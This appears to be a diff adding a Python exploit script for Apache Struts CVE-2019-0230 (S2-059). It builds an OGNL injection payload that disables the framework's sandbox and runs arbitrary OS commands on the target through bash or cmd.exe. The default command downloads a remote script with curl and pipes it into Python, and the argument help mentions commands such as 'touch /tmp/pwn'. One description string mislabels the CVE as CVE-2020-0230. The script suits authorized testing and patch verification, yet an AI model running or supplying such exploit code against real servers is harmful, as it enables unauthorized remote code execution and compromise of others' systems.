@@ -1,0 +1,163 @@
+# Exploit Title: Apache Struts 2.5.20 - Double OGNL evaluation
+# Date: 08/18/2020
+# Exploit Author: West Shepherd
+# Vendor Homepage: https://struts.apache.org/download.cgi
+# Version: Struts 2.0.0 - Struts 2.5.20 (S2-059)
+# CVE : CVE-2019-0230
+# Credit goes to reporters Matthias Kaiser, Apple InformationSecurity, and the Github example from PrinceFPF.
+# Source(s):
+# https://github.com/PrinceFPF/CVE-2019-0230
+# https://cwiki.apache.org/confluence/display/WW/S2-059
+# *Fix it, upgrade to: https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.22
+
+# !/usr/bin/python
+from sys import argv, exit, stdout, stderr
+import argparse
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+import logging
+
+
+class Exploit:
+    def __init__(
+            self,
+            target='',
+            redirect=False,
+            proxy_address=''
+    ):
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        self.target = target
+        self.session = requests.session()
+        self.redirect = redirect
+        self.timeout = 0.5
+        self.proxies = {
+            'http': 'http://%s' % proxy_address,
+            'https': 'http://%s' % proxy_address
+        } \
+            if proxy_address is not None \
+               and proxy_address != '' else {}
+        self.query_params = {}
+        self.form_values = {}
+        self.cookies = {}
+        boundary = "---------------------------735323031399963166993862150"
+        self.headers = {
+            'Content-Type': 'multipart/form-data; boundary=%s' % boundary,
+            'Accept': '*/*',
+            'Connection': 'close'
+        }
+        payload = "%{(#nike='multipart/form-data')." \
+                  "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
+                  "(#_memberAccess?(#_memberAccess=#dm):" \
+
+"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+\
+
+"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+\
+                  "(#ognlUtil.getExcludedPackageNames().clear())." \
+                  "(#ognlUtil.getExcludedClasses().clear())." \
+                  "(#context.setMemberAccess(#dm)))).(#cmd='{COMMAND}')." \
+
+"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+\
+
+"(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." \
+                  "(#p=new
+java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))." \
+
+"(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse()."
+\
+
+"getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+\
+                  "(#ros.flush())}"
+
+        self.payload = "--%s\r\nContent-Disposition: form-data;
+name=\"foo\"; " \
+                       "filename=\"%s\0b\"\r\nContent-Type:
+text/plain\r\n\r\nx\r\n--%s--\r\n\r\n" % (
+                           boundary, payload, boundary
+                       )
+
+    def do_get(self, url, params=None, data=None):
+        return self.session.get(
+            url=url,
+            verify=False,
+            allow_redirects=self.redirect,
+            headers=self.headers,
+            cookies=self.cookies,
+            proxies=self.proxies,
+            data=data,
+            params=params
+        )
+
+    def do_post(self, url, data=None, params=None):
+        return self.session.post(
+            url=url,
+            data=data,
+            verify=False,
+            allow_redirects=self.redirect,
+            headers=self.headers,
+            cookies=self.cookies,
+            proxies=self.proxies,
+            params=params
+        )
+
+    def debug(self):
+        try:
+            import http.client as http_client
+        except ImportError:
+            import httplib as http_client
+        http_client.HTTPConnection.debuglevel = 1
+        logging.basicConfig()
+        logging.getLogger().setLevel(logging.DEBUG)
+        requests_log = logging.getLogger("requests.packages.urllib3")
+        requests_log.setLevel(logging.DEBUG)
+        requests_log.propagate = True
+        return self
+
+    def send_payload(self, command='curl --insecure -sv
+https://10.10.10.10/shell.py|python -'):
+        url = self.target
+        stdout.write('sending payload to %s payload %s' % (url, command))
+        resp = self.do_post(url=url, params=self.query_params,
+data=self.payload.replace('{COMMAND}', command))
+        return resp
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(add_help=True,
+                                     description='CVE-2020-0230 Struts
+2 exploit')
+    try:
+        parser.add_argument('-target', action='store', help='Target
+address: http(s)://target.com/index.action')
+        parser.add_argument('-command', action='store',
+                            help='Command to execute: touch /tmp/pwn')
+        parser.add_argument('-debug', action='store', default=False,
+help='Enable debugging: False')
+        parser.add_argument('-proxy', action='store', default='',
+help='Enable proxy: 10.10.10.10:8080')
+
+        if len(argv) == 1:
+            parser.print_help()
+            exit(1)
+        options = parser.parse_args()
+
+        exp = Exploit(
+            proxy_address=options.proxy,
+            target=options.target
+        )
+
+        if options.debug:
+            exp.debug()
+            stdout.write('target %s debug %s proxy %s\n' % (
+                options.target, options.debug, options.proxy
+            ))
+
+        result = exp.send_payload(command=options.command)
+        stdout.write('Response: %d\n' % result.status_code)
+
+    except Exception as error:
+
+stderr.write('error in main %s' % str(error))
